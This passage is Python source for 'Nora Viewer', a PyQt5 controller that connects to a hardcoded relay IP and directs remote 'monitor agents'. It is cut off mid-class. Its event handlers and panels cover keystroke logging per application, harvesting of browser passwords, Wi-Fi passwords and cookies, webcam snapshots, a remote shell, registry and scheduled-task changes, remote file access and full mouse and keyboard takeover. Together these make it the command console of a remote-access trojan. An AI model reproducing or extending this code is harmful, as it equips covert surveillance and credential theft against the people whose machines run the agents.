#!/usr/bin/env python3
"""Nora Viewer — PyQt5 desktop controller for nora-monitor agents."""
import sys, os, struct, threading, base64, json, time, hashlib
import queue as _queue
import socket as _rawsock
import urllib.parse as _urlparse
from typing import Optional

from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
import socketio as _sio

RELAY_URL  = os.environ.get("NORA_RELAY",  "http://162.35.37.67:5000")
HUB_SECRET = os.environ.get("NORA_SECRET", "")

# Derive relay UDP address from RELAY_URL
_parsed      = _urlparse.urlparse(RELAY_URL)
_FC_UDP_HOST = _parsed.hostname or "162.35.37.67"
_FC_UDP_PORT = int(os.environ.get("NORA_UDP_PORT", _parsed.port or 5000))

_T_HELLO_HOST, _T_HELLO_VIEW, _T_VIDEO, _T_INPUT, _T_KEYREQ, _T_PING = 1, 2, 3, 4, 5, 6


class FcUdpClient:
    """Pure-UDP fastcap viewer — zero TCP/WebSocket on the video path."""

    def __init__(self, session_hex: str, password: str, frame_cb):
        self._sid      = bytes.fromhex(session_hex)
        self._sid_hex  = session_hex
        self._token    = hashlib.sha256(password.encode() + session_hex.encode()).digest()[:8]
        self._frame_cb = frame_cb   # callable(annex_b: bytes, is_keyframe: bool)
        self._relay    = (_FC_UDP_HOST, _FC_UDP_PORT)
        self._sock     = _rawsock.socket(_rawsock.AF_INET, _rawsock.SOCK_DGRAM)
        self._sock.setsockopt(_rawsock.SOL_SOCKET, _rawsock.SO_RCVBUF, 4 * 1024 * 1024)
        self._sock.settimeout(1.0)
        self._frames   = {}    # frame_id -> [cnt, {idx: bytes}]
        self._next_id  = None
        self._running  = False

    def start(self):
        self._running = True
        self._send_hello()
        threading.Thread(target=self._recv_loop,  daemon=True, name="fc-udp-rx").start()
        threading.Thread(target=self._keepalive,  daemon=True, name="fc-udp-ka").start()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass

    def send_input(self, payload: bytes):
        try:
            self._sock.sendto(bytes([_T_INPUT]) + self._sid + self._token + payload, self._relay)
        except Exception:
            pass

    def send_keyreq(self):
        try:
            self._sock.sendto(bytes([_T_KEYREQ]) + self._sid + self._token, self._relay)
        except Exception:
            pass

    def _send_hello(self):
        try:
            self._sock.sendto(bytes([_T_HELLO_VIEW]) + self._sid + self._token, self._relay)
        except Exception:
            pass

    def _keepalive(self):
        while self._running:
            time.sleep(5)
            if not self._running:
                break
            self._send_hello()   # refreshes NAT mapping + relay keepalive
            try:
                self._sock.sendto(bytes([_T_PING]) + self._sid + self._token, self._relay)
            except Exception:
                pass

    def _recv_loop(self):
        while self._running:
            try:
                data, _ = self._sock.recvfrom(65536)
            except _rawsock.timeout:
                continue
            except Exception:
                break
            # relay→viewer: [T_VIDEO(1)][session(8)][kf(1)][fid(4BE)][idx(2BE)][cnt(2BE)][data]
            if len(data) < 18 or data[0] != _T_VIDEO:
                continue
            kf  = bool(data[9])
            fid, idx, cnt = struct.unpack_from(">IHH", data, 10)
            frag = data[18:]

            if self._next_id is not None and fid < self._next_id and self._next_id - fid < 1000:
                continue   # stale fragment

            entry = self._frames.setdefault(fid, [cnt, {}])
            entry[1][idx] = frag

            if len(entry[1]) != cnt:
                if len(self._frames) > 60:
                    self._frames.clear()
                continue

            frame_data = b"".join(entry[1][i] for i in range(cnt))
            lost = self._next_id is not None and fid > self._next_id
            for old in [k for k in list(self._frames) if k <= fid]:
                del self._frames[old]
            self._next_id = fid + 1

            if lost:
                self.send_keyreq()
                continue

            try:
                self._frame_cb(frame_data, kf)
            except Exception:
                pass

# ── fastcap input payload builders ───────────────────────────────────────────
def _fc_move(nx: float, ny: float) -> bytes:
    b = bytearray(9); b[0] = 1
    struct.pack_into('>f', b, 1, nx); struct.pack_into('>f', b, 5, ny)
    return bytes(b)

def _fc_btn(button: int, down: bool) -> bytes:
    return bytes([2, button, 1 if down else 0])

def _fc_scroll(dy: int) -> bytes:
    b = bytearray(3); b[0] = 3; struct.pack_into('>h', b, 1, dy)
    return bytes(b)

def _fc_key(code: int, down: bool) -> bytes:
    return bytes([5, code, 1 if down else 0])

def _fc_type(ch: str) -> bytes:
    return bytes([4]) + ch.encode('utf-8')

def _fc_ctrl(ch: str) -> list:
    enc = ch.encode('utf-8')
    return [_fc_key(14, True), bytes([6]) + enc, _fc_key(14, False)]

_FC_KEYMAP = {
    Qt.Key_Return:9999, Qt.Key_Enter:1, Qt.Key_Backspace:2,
    Qt.Key_Tab:3, Qt.Key_Escape:4, Qt.Key_Left:5, Qt.Key_Right:6,
    Qt.Key_Up:7, Qt.Key_Down:8, Qt.Key_Delete:9,
}
_FC_KEYMAP[Qt.Key_Return] = 1

# ── H.264 decoder (PyAV) ─────────────────────────────────────────────────────
try:
    import av as _av; _AV_OK = True
except ImportError:
    _AV_OK = False

class H264Decoder:
    def __init__(self):
        self._ctx = None; self._lock = threading.Lock(); self._init()

    def _init(self):
        if not _AV_OK: return
        try:
            self._ctx = _av.CodecContext.create('h264', 'r')
        except Exception:
            self._ctx = None

    def decode(self, annex_b: bytes) -> Optional[QImage]:
        with self._lock:
            if self._ctx is None: self._init()
            if self._ctx is None: return None
            try:
                pkt = _av.Packet(annex_b)
                for frame in self._ctx.decode(pkt):
                    rf = frame.to_rgb()
                    data = rf.planes[0].to_bytes()
                    w, h = frame.width, frame.height
                    img = QImage(data, w, h, w*3, QImage.Format_RGB888)
                    return img.copy()
            except Exception:
                self._init()
        return None

# ── Relay signals bridge ──────────────────────────────────────────────────────
class RelaySignals(QObject):
    connected    = pyqtSignal()
    disconnected = pyqtSignal()
    agent_list   = pyqtSignal(list)
    frame        = pyqtSignal(str, str)        # agent, b64jpeg
    camera_frame = pyqtSignal(str, str)
    key_event    = pyqtSignal(dict)
    clipboard    = pyqtSignal(str, str)        # agent, text
    fastcap_info = pyqtSignal(dict)
    fastcap_video= pyqtSignal(str, bytes)      # session_hex, raw
    fastcap_ready= pyqtSignal(bool)
    generic      = pyqtSignal(str, object)     # event, data

# ── Relay client ──────────────────────────────────────────────────────────────
class RelayClient(QObject):
    def __init__(self, sig: RelaySignals):
        super().__init__()
        self.sig = sig
        self.sio = _sio.Client(reconnection=True, reconnection_attempts=0,
                               logger=False, engineio_logger=False)
        self._agent = ""
        self._setup()
        threading.Thread(target=self._run, daemon=True, name="relay").start()

    def _setup(self):
        sio, sig = self.sio, self.sig

        @sio.on("connect")
        def _c():
            sio.emit("hub_join", {"secret": HUB_SECRET})
            sig.connected.emit()

        @sio.on("disconnect")
        def _d(): sig.disconnected.emit()

        @sio.on("agent_list")
        def _al(data): sig.agent_list.emit(data or [])

        @sio.on("frame")
        def _fr(data):
            if data.get("_agent") == self._agent:
                sig.frame.emit(data["_agent"], data.get("data",""))

        @sio.on("camera_frame")
        def _cf(data):
            sig.camera_frame.emit(data.get("_agent",""), data.get("data",""))

        @sio.on("key")
        def _kl(data): sig.key_event.emit(data)

        @sio.on("clipboard")
        def _cb(data): sig.clipboard.emit(data.get("_agent",""), data.get("text",""))

        @sio.on("fastcap_info")
        def _fi(data): sig.fastcap_info.emit(data)

        @sio.on("fastcap_video")
        def _fv(data):
            s = data.get("s",""); raw = data.get("d", b"")
            if isinstance(raw, list): raw = bytes(raw)
            if isinstance(raw, (bytes, bytearray)):
                sig.fastcap_video.emit(s, bytes(raw))

        @sio.on("fastcap_ready")
        def _fr2(data): sig.fastcap_ready.emit(bool(data.get("host")))

        for ev in ("processes_result","dir_result","file_data","write_result",
                   "delete_result","rename_result","copy_result","move_result",
                   "upload_ready","upload_progress","upload_result",
                   "sysinfo_result","history_result","cookies_data",
                   "import_result","screenshot_result","recording_started",
                   "recording_result","wifi_passwords_result","browser_passwords_result",
                   "env_vars_result","drives_result","search_result",
                   "event_logs_result","registry_result","set_registry_result",
                   "users_result","scheduled_tasks_result","create_task_result",
                   "delete_task_result","lan_scan_result","dns_cache_result",
                   "netconns_result","programs_result","startup_result",
                   "wallpaper_result","set_wallpaper_result","notification_result",
                   "power_result","shell_started","shell_output","command_result",
                   "privacy_result","webcam_snapshot_result","active_window_result",
                   "volume_result","monitors_result","clipboard_set_result",
                   "force_update_result","keylog_status"):
            def _mk(e):
                @sio.on(e)
                def _h(data): sig.generic.emit(e, data)
            _mk(ev)

    def _run(self):
        while True:
            try:
                self.sio.connect(RELAY_URL, transports=["polling","websocket"])
                self.sio.wait()
            except Exception:
                pass
            time.sleep(3)

    def emit(self, event: str, data: dict):
        try:
            if self.sio.connected:
                self.sio.emit(event, data)
        except Exception:
            pass

    def set_agent(self, name: str):
        self._agent = name

    def cmd(self, payload: dict):
        if self._agent:
            payload["_target"] = self._agent
            self.emit("command", payload)

    def fc_send(self, session: str, payload: bytes):
        self.emit("fastcap_input", {"s": session, "d": list(payload)})

    def fc_keyreq(self, session: str):
        self.emit("fastcap_keyreq", {"s": session})

# ── Fast View overlay window ──────────────────────────────────────────────────
class FastViewWidget(QWidget):
    def __init__(self, relay: RelayClient, parent=None):
        super().__init__(parent, Qt.Window | Qt.FramelessWindowHint)
        self.relay = relay
        self.session = ""
        self.decoder = H264Decoder()
        self._frame   : Optional[QImage] = None
        self._fc_udp  : Optional[FcUdpClient] = None
        self._fw = self._fh = 1
        self._mm_last = 0.0
        self._open = False

        self.setStyleSheet("background:#000")
        self.setFocusPolicy(Qt.StrongFocus)
        self.setCursor(Qt.CrossCursor)

        bar = QWidget(self); bar.setFixedHeight(30)
        bar.setStyleSheet("background:rgba(0,0,0,200)")
        bl = QHBoxLayout(bar); bl.setContentsMargins(10,0,10,0); bl.setSpacing(8)
        self._st = QLabel("⚡ Connecting…"); self._st.setStyleSheet("color:#666;font-size:12px")
        btn_close = QPushButton("✕ Close")
        btn_close.setStyleSheet("background:#333;color:#aaa;border:none;padding:3px 12px;border-radius:3px;font-size:12px")
        btn_close.clicked.connect(self.close_view)
        bl.addWidget(self._st); bl.addStretch(); bl.addWidget(btn_close)

        self._bar = bar
        self._fps_count = 0
        self._fps_timer = QTimer(self); self._fps_timer.timeout.connect(self._update_fps)
        self._fps_timer.setInterval(1000)

        self._draw_timer = QTimer(self); self._draw_timer.timeout.connect(self.update)
        self._draw_timer.setInterval(16)  # ~60fps redraw

        self.installEventFilter(self)

    def resizeEvent(self, e):
        self._bar.setGeometry(0, self.height()-30, self.width(), 30)

    def open_view(self, session: str, password: str):
        self.session = session
        self._frame = None; self._fw = self._fh = 1
        self._open = True
        # Stop any previous UDP client
        if self._fc_udp:
            self._fc_udp.stop()
        self._fc_udp = FcUdpClient(session, password, self._on_udp_frame)
        self._fc_udp.start()
        self.showFullScreen()
        self.activateWindow(); self.setFocus()
        self._st.setText("⚡ UDP connecting…")
        self._fps_timer.start()
        self._draw_timer.start()

    def close_view(self):
        self._open = False
        self._draw_timer.stop(); self._fps_timer.stop()
        if self._fc_udp:
            self._fc_udp.stop()
            self._fc_udp = None
        self.hide()

    def _on_udp_frame(self, annex_b: bytes, is_keyframe: bool):
        """Called from UDP receive thread — decode and store frame."""
        img = self.decoder.decode(annex_b)
        if img:
            self._frame = img
            self._fw = img.width(); self._fh = img.height()
            self._fps_count += 1
            if self._fps_count == 1:
                QMetaObject.invokeMethod(
                    self._st, "setText", Qt.QueuedConnection,
                    Q_ARG(str, "⚡ UDP stream live")
                )

    def on_frame(self, session_hex: str, raw: bytes):
        """Legacy Socket.IO path — not used for UDP desktop viewer."""
        pass

    def on_ready(self, host_alive: bool):
        self._st.setText("⚡ Host connected" if host_alive else "⚡ Waiting for host…")

    def _update_fps(self):
        if self._frame:
            self._st.setText(f"⚡ {self._fps_count} fps · {self._fw}×{self._fh}")
        self._fps_count = 0

    def paintEvent(self, e):
        p = QPainter(self)
        p.fillRect(self.rect(), Qt.black)
        if self._frame:
            sw, sh = self.width(), self.height() - 30
            scale = min(sw / max(self._fw,1), sh / max(self._fh,1))
            dw, dh = int(self._fw*scale), int(self._fh*scale)
            ox, oy = (sw-dw)//2, (sh-dh)//2
            p.drawImage(QRect(ox, oy, dw, dh), self._frame)

    def _to_remote(self, cx: int, cy: int):
        sw, sh = self.width(), self.height()-30
        scale = min(sw/max(self._fw,1), sh/max(self._fh,1))
        dw, dh = self._fw*scale, self._fh*scale
        ox, oy = (sw-dw)/2, (sh-dh)/2
        nx = max(0.0, min(1.0, (cx-ox)/dw))
        ny = max(0.0, min(1.0, (cy-oy)/dh))
        return nx, ny

    def _fc(self, payload):
        if self._fc_udp:
            self._fc_udp.send_input(payload)

    def mouseMoveEvent(self, e):
        if not self._frame: return
        now = time.monotonic()
        if now - self._mm_last < 0.016: return
        self._mm_last = now
        nx, ny = self._to_remote(e.x(), e.y())
        self._fc(_fc_move(nx, ny))

    def mousePressEvent(self, e):
        if not self._frame: return
        nx, ny = self._to_remote(e.x(), e.y())
        self._fc(_fc_move(nx, ny))
        btn = {Qt.LeftButton:0, Qt.RightButton:2, Qt.MidButton:1}.get(e.button(), 0)
        self._fc(_fc_btn(btn, True))

    def mouseReleaseEvent(self, e):
        btn = {Qt.LeftButton:0, Qt.RightButton:2, Qt.MidButton:1}.get(e.button(), 0)
        self._fc(_fc_btn(btn, False))

    def wheelEvent(self, e):
        dy = 1 if e.angleDelta().y() < 0 else -1
        self._fc(_fc_scroll(dy))

    def keyPressEvent(self, e):
        if e.key() == Qt.Key_Escape: self.close_view(); return
        code = _FC_KEYMAP.get(e.key())
        if code:
            self._fc(_fc_key(code, True)); self._fc(_fc_key(code, False))
        elif e.modifiers() & Qt.ControlModifier and e.text():
            for p in _fc_ctrl(e.text().lower()): self._fc(p)
        elif e.text():
            self._fc(_fc_type(e.text()))

    def contextMenuEvent(self, e): e.ignore()

# ── Dark palette helper ───────────────────────────────────────────────────────
def _dark_palette():
    p = QPalette()
    bg = QColor("#09090b"); surf = QColor("#111318"); surf2 = QColor("#1a1d27")
    accent = QColor("#6366f1"); text = QColor("#f4f4f5"); text2 = QColor("#a1a1aa")
    border = QColor("#1e1e26")
    for role, col in [
        (QPalette.Window, bg), (QPalette.WindowText, text),
        (QPalette.Base, surf), (QPalette.AlternateBase, surf2),
        (QPalette.ToolTipBase, surf2), (QPalette.ToolTipText, text),
        (QPalette.Text, text), (QPalette.Button, surf2),
        (QPalette.ButtonText, text), (QPalette.BrightText, QColor("#fff")),
        (QPalette.Link, accent), (QPalette.Highlight, accent),
        (QPalette.HighlightedText, QColor("#fff")),
    ]: p.setColor(role, col)
    return p

# ── Shared style snippets ─────────────────────────────────────────────────────
_BTN_S = ("QPushButton{background:#1a1d27;color:#a1a1aa;border:1px solid #2a2d3a;"
          "border-radius:7px;padding:5px 12px;font-size:12px}"
          "QPushButton:hover{border-color:#6366f1;color:#818cf8}"
          "QPushButton:disabled{color:#444}")
_BTN_P = ("QPushButton{background:#6366f1;color:#fff;border:1px solid #6366f1;"
          "border-radius:7px;padding:5px 12px;font-size:12px}"
          "QPushButton:hover{opacity:.85}")
_BTN_D = ("QPushButton{background:#1a1d27;color:#ef4444;border:1px solid #2a2d3a;"
          "border-radius:7px;padding:5px 12px;font-size:12px}"
          "QPushButton:hover{border-color:#ef4444}")
_INP   = ("QLineEdit,QTextEdit,QPlainTextEdit{background:#1a1d27;color:#f4f4f5;"
          "border:1px solid #2a2d3a;border-radius:8px;padding:6px 10px;font-size:12px}"
          "QLineEdit:focus,QTextEdit:focus{border-color:#6366f1}")
_TABLE = ("QTableWidget{background:#09090b;color:#f4f4f5;gridline-color:#1e1e26;"
          "border:none;font-size:12px}"
          "QTableWidget::item:selected{background:#6366f1;color:#fff}"
          "QHeaderView::section{background:#111318;color:#71717a;border:none;"
          "border-bottom:1px solid #1e1e26;padding:5px 10px;font-size:11px}")
_LIST  = ("QListWidget{background:#09090b;color:#f4f4f5;border:none;font-size:12px}"
          "QListWidget::item:hover{background:#1a1d27}"
          "QListWidget::item:selected{background:#6366f1}")

def _lbl(text, color="#a1a1aa", size=12, bold=False):
    l = QLabel(text); l.setStyleSheet(
        f"color:{color};font-size:{size}px;font-weight:{'700' if bold else '400'}")
    return l

def _sep():
    s = QFrame(); s.setFrameShape(QFrame.HLine)
    s.setStyleSheet("color:#1e1e26"); return s

def _card(title="", parent=None):
    w = QWidget(parent)
    w.setStyleSheet("background:#111318;border:1px solid #1e1e26;border-radius:10px")
    return w

# ── Panels ────────────────────────────────────────────────────────────────────

class ScreenPanel(QWidget):
    def __init__(self, relay: RelayClient, fv_win: FastViewWidget):
        super().__init__()
        self.relay = relay; self.fv_win = fv_win
        self._fv_info = None; self._rc = False
        self._fw = self._fh = 1; self._mm_last = 0.0
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0); layout.setSpacing(0)

        # Canvas
        self._canvas = QLabel(); self._canvas.setAlignment(Qt.AlignCenter)
        self._canvas.setStyleSheet("background:#000")
        self._canvas.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self._canvas.setFocusPolicy(Qt.StrongFocus)
        self._canvas.setMouseTracking(True)
        self._canvas.installEventFilter(self)
        layout.addWidget(self._canvas, 1)

        # RC bar
        rcbar = QWidget(); rcbar.setFixedHeight(36)
        rcbar.setStyleSheet("background:#111318;border-top:1px solid #1e1e26")
        rbl = QHBoxLayout(rcbar); rbl.setContentsMargins(10,0,10,0); rbl.setSpacing(6)
        lbl = QLabel("Desktop:"); lbl.setStyleSheet("color:#71717a;font-size:12px")
        self._rc_btn = QPushButton("🖱 Remote Control"); self._rc_btn.setStyleSheet(_BTN_S)
        self._rc_btn.clicked.connect(self._toggle_rc)
        self._rc_stat = QLabel("RC off — click canvas to control")
        self._rc_stat.setStyleSheet("color:#71717a;font-size:12px")
        self._fv_btn = QPushButton("⚡ Fast View"); self._fv_btn.setStyleSheet(_BTN_P)
        self._fv_btn.setVisible(False); self._fv_btn.clicked.connect(self._open_fv)
        for dc, lbl2 in [("new","+ New"),("left","← Left"),("right","Right →"),("close","✕ Close")]:
            b = QPushButton(lbl2); b.setStyleSheet(_BTN_S); b.setProperty("dc", dc)
            b.clicked.connect(lambda _, x=dc: relay.emit("desktop_cmd",{"cmd":x,"_target":relay._agent}))
            rbl.addWidget(b)
        rbl.addWidget(self._rc_btn); rbl.addStretch()
        rbl.addWidget(self._fv_btn); rbl.addWidget(self._rc_stat)
        layout.addWidget(rcbar)

        # Text send bar
        kbar = QWidget(); kbar.setFixedHeight(38)
        kbar.setStyleSheet("background:#111318;border-top:1px solid #1e1e26")
        kbl = QHBoxLayout(kbar); kbl.setContentsMargins(10,2,10,2); kbl.setSpacing(6)
        self._kb_in = QLineEdit(); self._kb_in.setPlaceholderText("Type text to send to remote PC…")
        self._kb_in.setStyleSheet(_INP); self._kb_in.returnPressed.connect(self._send_text)
        kb_send = QPushButton("Send"); kb_send.setStyleSheet(_BTN_P); kb_send.clicked.connect(self._send_text)
        kbl.addWidget(self._kb_in); kbl.addWidget(kb_send)
        layout.addWidget(kbar)

    def set_frame(self, b64: str):
        raw = base64.b64decode(b64)
        img = QImage(); img.loadFromData(raw)
        if not img.isNull():
            self._fw = img.width(); self._fh = img.height()
            pm = QPixmap.fromImage(img).scaled(
                self._canvas.width(), self._canvas.height(),
                Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self._canvas.setPixmap(pm)

    def set_fv_info(self, info: dict):
        self._fv_info = info; self._fv_btn.setVisible(True)

    def _open_fv(self):
        if not self._fv_info: return
        self.fv_win.open_view(self._fv_info["session"], self._fv_info["password"])

    def _toggle_rc(self):
        self._rc = not self._rc
        if self._rc:
            self._rc_btn.setText("🟢 Release (Esc)"); self._rc_btn.setStyleSheet(_BTN_P)
            self._rc_stat.setText("RC on — Esc to release")
            self._canvas.setFocus()
        else:
            self._rc_btn.setText("🖱 Remote Control"); self._rc_btn.setStyleSheet(_BTN_S)
            self._rc_stat.setText("RC off — click canvas to control")

    def _send_text(self):
        t = self._kb_in.text().strip()
        if not t: return
        self.relay.cmd({"action":"type","text":t}); self._kb_in.clear()

    def _cpos(self, ex, ey):
        pm = self._canvas.pixmap()
        if pm is None or pm.isNull(): return None, None
        cw, ch = self._canvas.width(), self._canvas.height()
        pw, ph = pm.width(), pm.height()
        ox, oy = (cw-pw)//2, (ch-ph)//2
        if pw == 0 or ph == 0: return None, None
        return (ex-ox)/pw, (ey-oy)/ph

    def eventFilter(self, obj, event):
        if obj is not self._canvas: return False
        t = event.type()
        if t == QEvent.MouseButtonPress:
            if not self._rc: self._toggle_rc(); return True
            x, y = self._cpos(event.x(), event.y())
            if x is None: return True
            self.relay.cmd({"action":"mousemove","x":x,"y":y,"sw":1,"sh":1})
            btn = {Qt.LeftButton:"left",Qt.RightButton:"right",Qt.MidButton:"middle"}.get(event.button(),"left")
            self.relay.cmd({"action":"mousedown","button":{"left":0,"right":2,"middle":1}[btn],"x":x,"y":y,"sw":1,"sh":1})
        elif t == QEvent.MouseButtonRelease:
            if not self._rc: return False
            x, y = self._cpos(event.x(), event.y())
            if x is None: return True
            btn = {Qt.LeftButton:0,Qt.RightButton:2,Qt.MidButton:1}.get(event.button(),0)
            self.relay.cmd({"action":"mouseup","button":btn,"x":x,"y":y,"sw":1,"sh":1})
        elif t == QEvent.MouseMove:
            if not self._rc: return False
            now = time.monotonic()
            if now - self._mm_last < 0.016: return True
            self._mm_last = now
            x, y = self._cpos(event.x(), event.y())
            if x is None: return True
            self.relay.cmd({"action":"mousemove","x":x,"y":y,"sw":1,"sh":1})
        elif t == QEvent.Wheel:
            if not self.relay._agent: return False
            self.relay.cmd({"action":"scroll","dy":event.angleDelta().y(),"_target":self.relay._agent})
        elif t == QEvent.KeyPress:
            if event.key() == Qt.Key_Escape: self._toggle_rc(); return True
            if not self._rc: return False
            self.relay.cmd({"action":"keydown","key":event.text(),"code":event.key()})
        elif t == QEvent.KeyRelease:
            if not self._rc: return False
            if event.key() == Qt.Key_Escape: return True
            self.relay.cmd({"action":"keyup","key":event.text(),"code":event.key()})
        return False


class KeylogPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        self._n = 0
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(42)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(14,0,14,0); bl.setSpacing(8)
        btn_on = QPushButton("▶ Start"); btn_on.setStyleSheet(_BTN_P)
        btn_off = QPushButton("■ Stop"); btn_off.setStyleSheet(_BTN_D)
        btn_clr = QPushButton("Clear"); btn_clr.setStyleSheet(_BTN_S)
        self._n_lbl = QLabel("0 keys"); self._n_lbl.setStyleSheet("color:#71717a;font-size:12px;margin-left:auto")
        btn_on.clicked.connect(lambda: relay.emit("keylog_on",{"_target":relay._agent}))
        btn_off.clicked.connect(lambda: relay.emit("keylog_off",{"_target":relay._agent}))
        btn_clr.clicked.connect(self._clear)
        for w in (btn_on,btn_off,btn_clr): bl.addWidget(w)
        bl.addStretch(); bl.addWidget(self._n_lbl)
        lay.addWidget(bar)
        self._feed = QTextEdit(); self._feed.setReadOnly(True)
        self._feed.setStyleSheet("QTextEdit{background:#09090b;color:#f4f4f5;border:none;"
                                 "font-family:'Fira Code','Courier New',monospace;font-size:12px;padding:8px}")
        lay.addWidget(self._feed, 1)

    def add_key(self, d: dict):
        if not self.isVisible(): return
        self._n += 1; self._n_lbl.setText(f"{self._n} keys")
        ch = d.get("char",""); app = d.get("app","Unknown")
        if ch == "⌫": ch = '<span style="color:#ef4444">⌫</span>'
        elif ch == "↵": ch = '<br>'
        self._feed.moveCursor(QTextCursor.End)
        self._feed.insertHtml(ch)
        sb = self._feed.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _clear(self):
        self._feed.clear(); self._n = 0; self._n_lbl.setText("0 keys")


class FilesPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        self._clip = None; self._dl_paths = set()
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        # Path bar
        pb = QWidget(); pb.setFixedHeight(40)
        pb.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        pbl = QHBoxLayout(pb); pbl.setContentsMargins(12,4,12,4); pbl.setSpacing(6)
        self._path = QLineEdit(); self._path.setStyleSheet(_INP); self._path.setPlaceholderText("Remote path…")
        self._path.returnPressed.connect(self._go)
        go = QPushButton("Go"); go.setStyleSheet(_BTN_P); go.clicked.connect(self._go)
        up_btn = QPushButton("⬆ Upload"); up_btn.setStyleSheet(_BTN_S); up_btn.clicked.connect(self._upload)
        pbl.addWidget(self._path); pbl.addWidget(go); pbl.addWidget(up_btn)
        lay.addWidget(pb)
        # File list
        self._list = QListWidget()
        self._list.setStyleSheet(_LIST)
        self._list.itemDoubleClicked.connect(self._item_dclick)
        self._list.setContextMenuPolicy(Qt.CustomContextMenu)
        self._list.customContextMenuRequested.connect(self._ctx)
        lay.addWidget(self._list, 1)
        # Edit area
        self._edit = QWidget(); self._edit.setVisible(False)
        el = QVBoxLayout(self._edit); el.setContentsMargins(12,8,12,8); el.setSpacing(6)
        self._edit_path = QLabel(""); self._edit_path.setStyleSheet("color:#71717a;font-size:11px;font-family:monospace")
        self._ta = QTextEdit(); self._ta.setStyleSheet(_INP)
        ebar = QWidget()
        ebl = QHBoxLayout(ebar); ebl.setContentsMargins(0,0,0,0); ebl.setSpacing(6)
        btn_close = QPushButton("✕ Close"); btn_close.setStyleSheet(_BTN_S)
        btn_dl = QPushButton("⬇ Download"); btn_dl.setStyleSheet(_BTN_S)
        btn_save = QPushButton("Save"); btn_save.setStyleSheet(_BTN_P)
        btn_close.clicked.connect(lambda: self._edit.setVisible(False))
        btn_dl.clicked.connect(self._download_current)
        btn_save.clicked.connect(self._save_file)
        for b in (btn_close, btn_dl, btn_save): ebl.addWidget(b)
        ebl.insertStretch(0)
        el.addWidget(self._edit_path); el.addWidget(self._ta, 1); el.addWidget(ebar)
        self._edit.setMaximumHeight(300)
        lay.addWidget(self._edit)
        self._current_path = ""; self._current_b64 = ""

    def _go(self):
        self.relay.emit("list_dir", {"path": self._path.text(), "_target": self.relay._agent})

    def on_dir(self, d: dict):
        self._list.clear(); self._path.setText(d.get("path",""))
        self._edit.setVisible(False)
        if d.get("parent"):
            item = QListWidgetItem("⬆  ..")
            item.setData(Qt.UserRole, {"type":"dir","path":d["parent"],"name":".."})
            self._list.addItem(item)
        for it in d.get("items",[]):
            ico = "📁" if it["type"]=="dir" else "📄"
            sz = f"  {self._fmt_b(it.get('size',0))}" if it["type"]=="file" else ""
            item = QListWidgetItem(f"{ico}  {it['name']}{sz}")
            item.setData(Qt.UserRole, it); self._list.addItem(item)

    def on_file(self, d: dict):
        if d.get("error"): return
        path = d.get("path","")
        if path in self._dl_paths:
            self._dl_paths.discard(path)
            self._save_local(path, base64.b64decode(d.get("data","")))
            return
        self._current_path = path; self._current_b64 = d.get("data","")
        try:
            text = base64.b64decode(self._current_b64).decode("utf-8")
        except Exception:
            text = "[binary — use Download]"
        self._edit_path.setText(path); self._ta.setPlainText(text)
        self._edit.setVisible(True)

    def _item_dclick(self, item):
        it = item.data(Qt.UserRole)
        if not it: return
        if it["type"] == "dir":
            self.relay.emit("list_dir", {"path":it["path"],"_target":self.relay._agent})
        else:
            self.relay.emit("read_file", {"path":it["path"],"_target":self.relay._agent})

    def _ctx(self, pos):
        item = self._list.itemAt(pos); it = item.data(Qt.UserRole) if item else None
        if not it: return
        menu = QMenu(self)
        menu.setStyleSheet("QMenu{background:#111318;color:#f4f4f5;border:1px solid #1e1e26}"
                           "QMenu::item:selected{background:#6366f1}")
        if it["type"]=="file":
            menu.addAction("⬇ Download").triggered.connect(lambda: self._dl_file(it["path"]))
        menu.addAction("✏ Rename").triggered.connect(lambda: self._rename(it))
        menu.addAction("🗑 Delete").triggered.connect(lambda: self._delete(it))
        menu.exec_(self._list.viewport().mapToGlobal(pos))

    def _dl_file(self, path):
        self._dl_paths.add(path)
        self.relay.emit("read_file",{"path":path,"_target":self.relay._agent})

    def _rename(self, it):
        name, ok = QInputDialog.getText(self, "Rename", "New name:", text=it["name"])
        if ok and name:
            self.relay.emit("rename_path",{"path":it["path"],"new_name":name,"_target":self.relay._agent})

    def _delete(self, it):
        if QMessageBox.question(self,"Delete",f"Delete {it['name']}?") == QMessageBox.Yes:
            self.relay.emit("delete_path",{"path":it["path"],"_target":self.relay._agent})

    def _save_file(self):
        if not self._current_path: return
        text = self._ta.toPlainText()
        b64 = base64.b64encode(text.encode("utf-8")).decode()
        self.relay.emit("write_file",{"path":self._current_path,"data":b64,"_target":self.relay._agent})

    def _download_current(self):
        if not self._current_b64 or not self._current_path: return
        self._save_local(self._current_path, base64.b64decode(self._current_b64))

    def _save_local(self, remote_path, data):
        name = remote_path.replace("\\","/").split("/")[-1]
        path, _ = QFileDialog.getSaveFileName(self,"Save File",name)
        if path:
            with open(path,"wb") as f: f.write(data)

    def _upload(self):
        src, _ = QFileDialog.getOpenFileName(self,"Upload file")
        if not src: return
        remote_dir = self._path.text().rstrip("\\/")
        name = os.path.basename(src)
        remote_path = remote_dir + "\\" + name
        with open(src,"rb") as f: data = f.read()
        b64 = base64.b64encode(data).decode()
        self.relay.emit("upload_file",{"path":remote_path,"data":b64,"_target":self.relay._agent})

    @staticmethod
    def _fmt_b(b):
        if b<1024: return f"{b} B"
        if b<1048576: return f"{b/1024:.1f} KB"
        return f"{b/1048576:.1f} MB"


class ProcessPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay; self._procs = []
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
